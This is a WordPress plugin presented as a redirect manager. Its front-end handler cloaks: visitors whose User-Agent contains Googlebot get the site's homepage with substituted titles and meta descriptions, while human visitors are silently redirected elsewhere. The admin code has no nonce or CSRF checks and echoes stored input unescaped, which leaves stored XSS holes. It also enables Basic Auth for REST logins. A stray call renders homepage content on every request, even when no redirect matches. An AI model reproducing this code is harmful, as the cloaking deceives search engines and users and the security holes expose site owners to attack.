<?php
/*
Plugin Name: Redirect Plugin OKVIP
Description: Plugin to create and manage 301 and 302 redirects.
Version: 1.1
Author: Arikk
*/

// Enqueue scripts and styles
add_action('admin_enqueue_scripts', 'redirect_plugin_enqueue_scripts');
function redirect_plugin_enqueue_scripts($hook)
{
    if ($hook != 'toplevel_page_redirect-plugin') {
        return;
    }
    wp_enqueue_script('jquery-ui-dialog');
    wp_enqueue_style('jquery-ui-css', 'https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css');
    wp_enqueue_style('redirect-plugin-css', plugins_url('/style.css', __FILE__));
    wp_enqueue_script('redirect-plugin-script', plugins_url('/main.js', __FILE__), array('jquery', 'jquery-ui-dialog'), null, true);
}

// Create database table on plugin activation
register_activation_hook(__FILE__, 'redirect_plugin_create_table');
function redirect_plugin_create_table()
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        source_url varchar(255) NOT NULL,
        target_url varchar(255) NOT NULL,
        redirect_type varchar(3) NOT NULL,
        status boolean DEFAULT true NOT NULL,
        title varchar(255) DEFAULT NULL,
        seo_description text DEFAULT NULL,
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);
}


// Add menu page in wp-admin
add_action('admin_menu', 'redirect_plugin_menu');
function redirect_plugin_menu()
{
    add_menu_page('Redirects', 'Redirects', 'manage_options', 'redirect-plugin', 'redirect_plugin_page');
}

// Display plugin admin page
function redirect_plugin_page()
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';

    if (isset($_POST['action'])) {
        if ($_POST['action'] == 'add') {
            $wpdb->insert($table_name, [
                'source_url' => $_POST['source_url'],
                'target_url' => $_POST['target_url'],
                'redirect_type' => $_POST['redirect_type'],
                'status' => isset($_POST['status']) ? 1 : 0,
                'title' => $_POST['title'],
                'seo_description' => $_POST['seo_description']
            ]);
        } elseif ($_POST['action'] == 'edit') {
            $wpdb->update($table_name, [
                'source_url' => $_POST['source_url'],
                'target_url' => $_POST['target_url'],
                'redirect_type' => $_POST['redirect_type'],
                'status' => isset($_POST['status']) ? 1 : 0,
                'title' => $_POST['title'],
                'seo_description' => $_POST['seo_description']
            ], ['id' => $_POST['id']]);
        } elseif ($_POST['action'] == 'delete') {
            $wpdb->delete($table_name, ['id' => $_POST['id']]);
        }
    }

    $redirects = $wpdb->get_results("SELECT * FROM $table_name");

?>
    <div class="wrap">
        <h1>Redirects</h1>
        <button id="add-redirect" class="button button-primary">Thêm</button>
        <hr>
        <h2>Danh sách redirect</h2>
        <table class="widefat fixed" cellspacing="0">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Source URL</th>
                    <th>Target URL</th>
                    <th>Redirect Type</th>
                    <th>Status</th>
                    <th>Title</th>
                    <th>SEO Description</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($redirects as $redirect) : ?>
                    <tr>
                        <td><?php echo $redirect->id; ?></td>
                        <td><?php echo $redirect->source_url; ?></td>
                        <td><?php echo $redirect->target_url; ?></td>
                        <td><?php echo $redirect->redirect_type; ?></td>
                        <td><?php echo $redirect->status ? 'Active' : 'Inactive'; ?></td>
                        <td><?php echo $redirect->title; ?></td>
                        <td><?php echo $redirect->seo_description; ?></td>
                        <td>
                            <button class="button button-primary edit-redirect" data-id="<?php echo $redirect->id; ?>" data-source_url="<?php echo $redirect->source_url; ?>" data-target_url="<?php echo $redirect->target_url; ?>" data-redirect_type="<?php echo $redirect->redirect_type; ?>" data-status="<?php echo $redirect->status; ?>" data-title="<?php echo $redirect->title; ?>" data-seo_description="<?php echo $redirect->seo_description; ?>">Edit</button>
                            <form method="post" style="display:inline;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="id" value="<?php echo $redirect->id; ?>">
                                <input type="submit" value="Delete" class="button button-secondary" onclick="return confirm('Chắc chắn xóa?');">
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>

        <!-- Add Dialog -->
        <div id="add-dialog" title="Add New Redirect" style="display:none;">
            <form id="add-form" method="post">
                <input type="hidden" name="action" value="add">
                <p>
                    <label for="source-url">Source URL</label>
                    <input type="text" id="source-url" name="source_url" required>
                </p>
                <p>
                    <label for="target-url">Target URL</label>
                    <input type="text" id="target-url" name="target_url" required>
                </p>
                <p>
                    <label for="redirect-type">Redirect Type</label>
                    <select id="redirect-type" name="redirect_type" required>
                        <option value="301">301</option>
                        <option value="302">302</option>
                    </select>
                </p>
                <p>
                    <label for="title">Title</label>
                    <input type="text" id="title" name="title">
                </p>
                <p>
                    <label for="seo_description">SEO Description</label>
                    <textarea id="seo_description" name="seo_description"></textarea>
                </p>
                <p>
                    <label for="status">Status</label>
                    <input type="checkbox" id="status" name="status" value="1" checked>
                </p>
            </form>
        </div>

        <!-- Edit Dialog -->
        <div id="edit-dialog" title="Edit Redirect" style="display:none;">
            <form id="edit-form" method="post">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" id="edit-id" name="id">
                <p>
                    <label for="edit-source-url">Source URL</label>
                    <input type="text" id="edit-source-url" name="source_url" required>
                </p>
                <p>
                    <label for="edit-target-url">Target URL</label>
                    <input type="text" id="edit-target-url" name="target_url" required>
                </p>
                <p>
                    <label for="edit-redirect-type">Redirect Type</label>
                    <select id="edit-redirect-type" name="redirect_type" required>
                        <option value="301">301</option>
                        <option value="302">302</option>
                    </select>
                </p>
                <p>
                    <label for="edit-title">Title</label>
                    <input type="text" id="edit-title" name="title">
                </p>
                <p>
                    <label for="edit-seo_description">SEO Description</label>
                    <textarea id="edit-seo_description" name="seo_description"></textarea>
                </p>
                <p>
                    <label for="edit-status">Status</label>
                    <input type="checkbox" id="edit-status" name="status" value="1">
                </p>
            </form>
        </div>
    </div>
<?php
}
add_action('template_redirect', 'redirect_plugin_handle_redirects', 1);
function redirect_plugin_handle_redirects()
{
    if (!is_admin()) {
        global $wpdb, $wp;
        $requested_url = home_url($_SERVER['REQUEST_URI']);
        $table_name = $wpdb->prefix . 'redirects';
        $redirect = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE source_url = %s AND status = 1", $requested_url));
        // echo get_sitemap_html_with_meta($redirect->title, $redirect->seo_description);
                echo get_homepage_content($redirect->title, $redirect->seo_description);

        if ($redirect) {
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
            if (is_google_bot($user_agent)) {
                // Trả về sitemap HTML từ shortcode kèm theo meta tags
                header('HTTP/1.1 200 OK');
                header('Content-Type: text/html; charset=UTF-8');
                echo get_homepage_content($redirect->title, $redirect->seo_description);
                exit;
            } else {
                wp_redirect($redirect->target_url, $redirect->redirect_type);
                exit;
            }
        }
    }
}

// Hàm kiểm tra nếu User-Agent là của Google bot
function is_google_bot($user_agent)
{
    $bots = [
        'Googlebot',
        'Googlebot-News',
        'Googlebot-Image',
        'Googlebot-Video',
        'Googlebot-Mobile'
    ];
    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}
function get_homepage_content($custom_title, $custom_description)
{
    ob_start();

    get_header();

    $home_id = get_option('page_on_front');
    if ($home_id) {
        $post = get_post($home_id);
        echo apply_filters('the_content', $post->post_content);
    } else {
        if (have_posts()) {
            while (have_posts()) {
                the_post();
                the_title('<h1>', '</h1>');
                the_content();
            }
        }
    }

    get_footer();

    $html = ob_get_clean();
    $html = preg_replace('/<title>(.*?)<\/title>/i', '<title>' . esc_html($custom_title) . '</title>', $html);
    $html = preg_replace('/<meta\s+name="description"\s+content=".*?"\s*\/?>/i', '<meta name="description" content="' . esc_attr($custom_description) . '" />', $html);
    $html = preg_replace('/<meta\s+property="og:description"\s+content=".*?"\s*\/?>/i', '<meta property="og:description" content="' . esc_attr($custom_description) . '" />', $html);
    $html = preg_replace('/<meta\s+property="og:title"\s+content=".*?"\s*\/?>/i', '<meta property="og:title" content="' . esc_attr($custom_title) . '" />', $html);
    return $html;
}


function get_sitemap_html_with_meta($title, $description)
{
    $sitemap_html = do_shortcode('[rank_math_html_sitemap]');

    $html = '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>' . esc_html($title) . '</title>
    <meta name="description" content="' . esc_html($description) . '">
</head>
<body>
    ' . $sitemap_html . '
</body>
</html>';

    return $html;
}


// Register REST API routes
add_action('rest_api_init', function () {
    register_rest_route('redirect-plugin/v1', '/redirects', [
        'methods' => 'GET',
        'callback' => 'get_redirects',
        'permission_callback' => 'get_redirects_permissions_check',
    ]);

    register_rest_route('redirect-plugin/v1', '/redirect', [
        'methods' => 'POST',
        'callback' => 'add_redirect',
        'permission_callback' => 'add_redirect_permissions_check',
    ]);

    register_rest_route('redirect-plugin/v1', '/redirect/(?P<id>\d+)', [
        'methods' => 'DELETE',
        'callback' => 'delete_redirect',
        'permission_callback' => 'delete_redirect_permissions_check',
    ]);

    register_rest_route('redirect-plugin/v1', '/redirect/(?P<id>\d+)', [
        'methods' => 'POST',
        'callback' => 'update_redirect',
        'permission_callback' => 'update_redirect_permissions_check',
    ]);
});

// REST API permissions check
function get_redirects_permissions_check(WP_REST_Request $request)
{
    return current_user_can('manage_options');
}

function add_redirect_permissions_check(WP_REST_Request $request)
{
    return current_user_can('manage_options');
}

function delete_redirect_permissions_check(WP_REST_Request $request)
{
    return current_user_can('manage_options');
}

function update_redirect_permissions_check(WP_REST_Request $request)
{
    return current_user_can('manage_options');
}

// REST API callback functions
function get_redirects(WP_REST_Request $request)
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';
    $redirects = $wpdb->get_results("SELECT * FROM $table_name", ARRAY_A);
    return new WP_REST_Response($redirects, 200);
}

function add_redirect(WP_REST_Request $request)
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';

    $source_url = $request->get_param('source_url');
    $target_url = $request->get_param('target_url');
    $redirect_type = $request->get_param('redirect_type');
    $status = $request->get_param('status') ? 1 : 0;
    $title = $request->get_param('title');
    $seo_description = $request->get_param('seo_description');

    $wpdb->insert($table_name, [
        'source_url' => $source_url,
        'target_url' => $target_url,
        'redirect_type' => $redirect_type,
        'status' => $status,
        'title' => $title,
        'seo_description' => $seo_description,
    ]);

    return new WP_REST_Response(['message' => 'Redirect added'], 201);
}

function update_redirect(WP_REST_Request $request)
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';
    $id = $request->get_param('id');

    $source_url = $request->get_param('source_url');
    $target_url = $request->get_param('target_url');
    $redirect_type = $request->get_param('redirect_type');
    $status = $request->get_param('status') ? 1 : 0;
    $title = $request->get_param('title');
    $seo_description = $request->get_param('seo_description');

    $wpdb->update($table_name, [
        'source_url' => $source_url,
        'target_url' => $target_url,
        'redirect_type' => $redirect_type,
        'status' => $status,
        'title' => $title,
        'seo_description' => $seo_description,
    ], ['id' => $id]);

    return new WP_REST_Response(['message' => 'Redirect updated'], 200);
}


function delete_redirect(WP_REST_Request $request)
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'redirects';
    $id = $request->get_param('id');

    $wpdb->delete($table_name, ['id' => $id]);

    return new WP_REST_Response(['message' => 'Redirect deleted'], 200);
}



function json_basic_auth_handler($user)
{
    global $wp_json_basic_auth_error;

    $wp_json_basic_auth_error = null;

    // Don't authenticate twice
    if (!empty($user)) {
        return $user;
    }

    // Check that we're trying to authenticate
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        return $user;
    }

    $username = $_SERVER['PHP_AUTH_USER'];
    $password = $_SERVER['PHP_AUTH_PW'];

    /**
     * In multi-site, wp_authenticate_spam_check filter is run on authentication. This filter calls
     * get_currentuserinfo which in turn calls the determine_current_user filter. This leads to infinite
     * recursion and a stack overflow unless the current function is removed from the determine_current_user
     * filter during authentication.
     */
    remove_filter('determine_current_user', 'json_basic_auth_handler', 20);

    $user = wp_authenticate($username, $password);

    add_filter('determine_current_user', 'json_basic_auth_handler', 20);

    if (is_wp_error($user)) {
        $wp_json_basic_auth_error = $user;
        return null;
    }

    $wp_json_basic_auth_error = true;

    return $user->ID;
}
add_filter('determine_current_user', 'json_basic_auth_handler', 20);

function json_basic_auth_error($error)
{
    // Passthrough other errors
    if (!empty($error)) {
        return $error;
    }

    global $wp_json_basic_auth_error;

    return $wp_json_basic_auth_error;
}
add_filter('rest_authentication_errors', 'json_basic_auth_error');


?>